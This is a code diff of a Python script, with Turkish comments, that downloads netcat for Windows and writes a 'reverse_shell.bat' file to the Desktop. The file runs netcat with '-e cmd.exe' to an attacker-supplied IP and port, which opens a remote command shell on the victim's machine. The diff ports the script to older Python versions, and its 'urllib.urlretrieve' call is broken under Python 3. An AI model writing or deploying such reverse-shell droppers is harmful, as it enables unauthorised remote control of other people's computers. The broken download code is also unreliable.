@@ -1,19 +1,18 @@
 import os
-import requests
+import requests  # Bu kütüphane eski Python sürümlerinde mevcut olmayabilir; alternatif yöntemlerle indirme yapılabilir.
 import zipfile
 import subprocess
 import time
 
-# Netcat'i indirme fonksiyonu
+# Netcat'i indirme fonksiyonu (Python 3.1.3 için requests kullanılmazsa, urllib kullanılabilir)
 def download_netcat():
     url = "https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip"
-    nc_zip_path = os.path.expanduser(r"~\\nc.zip")
-    nc_extract_path = os.path.expanduser(r"~\\netcat")
+    nc_zip_path = os.path.expanduser("~\\nc.zip")
+    nc_extract_path = os.path.expanduser("~\\netcat")
 
-    # Netcat'i indir
-    response = requests.get(url)
-    with open(nc_zip_path, 'wb') as f:
-        f.write(response.content)
+    # Netcat'i indir (requests yerine urllib kullanımı eski sürümlerde)
+    import urllib
+    urllib.urlretrieve(url, nc_zip_path)
 
     # Netcat'i zipten çıkar
     with zipfile.ZipFile(nc_zip_path, 'r') as zip_ref:
@@ -21,10 +20,10 @@ def download_netcat():
 
     return os.path.join(nc_extract_path, 'nc.exe')
 
-# Bat dosyasını oluşturma fonksiyonu
+# Bat dosyasını oluşturma fonksiyonu (format() kullanılıyor)
 def create_bat_file(nc_path, attacker_ip, attacker_port):
-    bat_content = f"@echo off\n{nc_path} -e cmd.exe {attacker_ip} {attacker_port}"
-    bat_path = os.path.expanduser(r"~\\Desktop\\reverse_shell.bat")
+    bat_content = "@echo off\n{} -e cmd.exe {} {}".format(nc_path, attacker_ip, attacker_port)
+    bat_path = os.path.expanduser("~\\Desktop\\reverse_shell.bat")
 
     with open(bat_path, 'w') as f:
         f.write(bat_content)
